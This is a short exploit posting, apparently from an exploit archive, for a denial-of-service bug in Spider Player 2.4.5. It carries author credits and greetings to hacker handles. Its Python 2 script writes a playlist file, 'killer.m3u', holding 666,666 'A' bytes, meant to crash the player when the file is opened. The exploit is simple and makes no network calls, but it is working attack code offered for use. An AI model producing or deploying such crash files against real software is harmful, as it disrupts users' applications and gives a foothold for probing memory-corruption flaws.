#Exploit Title : Spider Player Denial of Service Vulnerability
#Software : Spider Player 
#Software link : http://spider-player.com/spider/files/Spider_Player_2.4.5_Setup.exe
#Autor : ABDI MOHAMED
#Email : abdimohamed@hotmail.fr
#greetz: net_own3r , sadhacker , net-decrypt3r , xa7m3d , the commander , mr.fearfactor and all tunisian hackers
#Software version : 2.4.5
#Tested on : Win7 Ultimate fr + win xp sp 2
#!/usr/bin/python
outfile="killer.m3u"
junk="\x41" * 666666
FILE=open(outfile, "w")
FILE.write(junk)
FILE.close()
print "[+] File created succesufully , [+]"